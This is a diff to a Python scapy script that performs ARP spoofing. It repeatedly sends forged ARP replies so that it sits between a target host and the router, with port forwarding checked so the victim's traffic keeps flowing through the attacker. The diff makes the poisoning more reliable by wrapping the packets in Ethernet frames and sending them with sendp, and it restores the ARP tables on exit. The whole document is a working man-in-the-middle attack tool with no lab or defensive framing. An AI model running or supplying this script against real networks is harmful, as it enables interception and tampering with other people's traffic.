@@ -1,6 +1,5 @@
 #/usr/bin/env python
-# Rebuild
-from scapy.layers.l2 import ARP, getmacbyip
+from scapy.layers.l2 import ARP, getmacbyip, Ether
 import scapy.all as scapy
 import time
 import sys
@@ -11,21 +10,20 @@ check_port_forwarding()
 
 def spoof(target_ip, router_ip):
 	target_mac = getmacbyip(target_ip)
-	# pkt1 = ARP(op="is-at", psrc=router_ip, hwsrc=router_mac, pdst=victim_ip, hwdst=victim_mac)
 	packet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
-	scapy.send(packet, verbose=False)
+	# make sure the Ether dst matches the hwdst
+	eth_packet = Ether(dst=target_mac) / packet
+	scapy.sendp(eth_packet, verbose=False)
 
 def restore(destination_ip, source_ip):
 	destination_mac = getmacbyip(destination_ip)
 	source_mac = getmacbyip(source_ip)
 	packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
-	print(packet.show())
-	print(packet.summary())
+	# count=4, send packet 4 times just to be sure.
+	scapy.send(packet, count=4, verbose=False)
 
-restore(data["target_ip1"], data["router_ip"])
-
-sent_packets_count = 0
 try:
+	sent_packets_count = 0
 	while True:
 		spoof(data["target_ip1"], data["router_ip"])
 		spoof(data["router_ip"], data["target_ip1"])
@@ -36,3 +34,5 @@ try:
 		time.sleep(2)
 except KeyboardInterrupt:
 	print("\n[+] Detected CTRL + C ...... Quiting.")
+	restore(data["target_ip1"], data["router_ip"])
+	restore(data["router_ip"], data["target_ip1"])
